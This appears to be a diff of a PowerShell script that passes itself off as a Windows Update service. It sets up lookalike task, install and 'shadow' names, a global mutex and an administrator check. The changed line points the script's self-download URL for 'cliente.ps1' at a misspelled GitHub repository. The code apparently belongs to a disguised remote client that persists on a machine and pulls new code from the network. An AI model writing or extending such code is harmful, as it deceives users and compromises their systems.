@@ -12,7 +12,7 @@ $installName  = "WinUpdateSvc_$h"
 $taskName     = "MicrosoftWindowsUpdateService_$h"
 $shadowName   = "MicrosoftCompatibilityAppraiser_$h"
 $mutexName    = "Global\WinUpdateSvcMutex_$h" # ALTERADO PARA GLOBAL
-$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
+$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Updatee/refs/heads/main/cliente.ps1"
 
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
